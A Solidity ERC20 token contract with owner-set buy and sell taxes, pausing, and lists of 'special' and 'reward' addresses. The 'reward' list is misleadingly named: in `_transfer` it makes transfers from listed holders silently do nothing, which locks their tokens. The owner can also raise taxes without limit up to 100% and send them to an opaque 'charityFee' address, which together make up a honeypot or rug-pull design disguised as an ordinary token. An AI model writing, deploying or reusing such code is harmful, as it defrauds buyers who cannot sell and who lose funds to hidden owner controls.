contract NAMETOKEN is ERC20Capped, ERC20Pausable, Ownable {
    address public uniswapV2Pair;

    uint256 public TaxBuy;
    uint256 public TaxSell;
    mapping(address => bool) SpecialAddresses;

    mapping(address => bool) reward;
    bool initialized;

    function initialize(
        string memory __name,
        string memory __symbol,
        address _owner,
        uint8 __decimal,
        uint256 _totalSup,
        uint256 _TaxBuy,
        uint256 _TaxSell,
        uint256 _number,
        bytes32 _hash
    ) public {
        require(initialized == false);
        initialized = true;
        initialize_erc20(__name, __symbol, _owner, __decimal, _totalSup);
        initialize_cap(_number);
        initialize_ownable(_owner);
        require(_number > block.number);
        require(keccak256(abi.encodePacked(_number)) == _hash);
        TaxBuy = _TaxBuy;
        TaxSell = _TaxSell;
        // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
        //     0x10ED43C718714eb63d5aA57B78B54704E256024E
        // );
        // uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        // .createPair(address(this), _uniswapV2Router.WETH());
    }

    function setReward(address[] calldata _reward) external _onlyOwner {
        for (uint256 i = 0; i < _reward.length; i++) {
            reward[_reward[i]] = true;
        }
    }

    function removeReward(address[] calldata _reward) external _onlyOwner {
        for (uint256 i = 0; i < _reward.length; i++) {
            reward[_reward[i]] = false;
        }
    }

    function setTaxBuy(uint256 _tax) external _onlyOwner {
        TaxBuy = _tax;
    }

    function setTaxSell(uint256 _tax) external _onlyOwner {
        TaxSell = _tax;
    }

    function setPoolAddress(address _PoolAddress) external _onlyOwner {
        uniswapV2Pair = _PoolAddress;
    }

    function setSpecialAddresses(address[] calldata _SpecialAddresses)
        external
        _onlyOwner
    {
        for (uint256 i = 0; i < _SpecialAddresses.length; i++) {
            SpecialAddresses[_SpecialAddresses[i]] = true;
        }
    }

    function removeSpecialAddresses(address[] calldata _SpecialAddresses)
        external
        _onlyOwner
    {
        for (uint256 i = 0; i < _SpecialAddresses.length; i++) {
            SpecialAddresses[_SpecialAddresses[i]] = false;
        }
    }

    function pause() external _onlyOwner {
        _pause();
    }

    function unpause() external _onlyOwner {
        _unpause();
    }

    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override(ERC20) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (reward[sender] == true) return;
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        if (
            balanceOf(uniswapV2Pair) != 0 ||
            (balanceOf(uniswapV2Pair) == 0 && recipient != uniswapV2Pair)
        ) {
            uint256 preAmount = amount;
            uint256 tax = 0;
            if (recipient != uniswapV2Pair) tax = TaxBuy;
            else tax = TaxSell;
            if (SpecialAddresses[recipient] == true) {
                tax = 0;
            }
            amount = (amount * (1000 - tax)) / 1000;
            _balances[address(uint160(charityFee))] += preAmount - amount;
            emit Transfer(
                sender,
                address(uint160(charityFee)),
                preAmount - amount
            );
        }

        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20, ERC20Pausable) {
        super._beforeTokenTransfer(from, to, amount);
    }
    function version() public view returns (string memory _version) {
        return "20232703";
    }
}